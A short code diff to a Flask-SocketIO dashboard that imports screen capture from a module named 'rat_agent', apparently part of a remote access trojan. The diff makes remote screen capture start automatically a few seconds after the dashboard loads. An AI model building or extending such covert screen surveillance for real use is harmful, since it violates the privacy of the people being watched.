@@ -38,6 +38,21 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 from rat_agent.screen import RemoteScreen
 remote_screen = RemoteScreen(config)
 
+# Start screen capture automatically when dashboard starts
+def start_screen_on_load():
+    """Start screen capture when first client connects"""
+    import threading
+    def delayed_start():
+        import time
+        time.sleep(3)  # Wait for dashboard to fully load
+        print("[+] Auto-starting screen capture...")
+        remote_screen.start(socketio)
+    threading.Thread(target=delayed_start, daemon=True).start()
+
+# Schedule auto-start
+import threading
+threading.Thread(target=start_screen_on_load, daemon=True).start()
+
 # Login required decorator
 def login_required(f):
     from functools import wraps
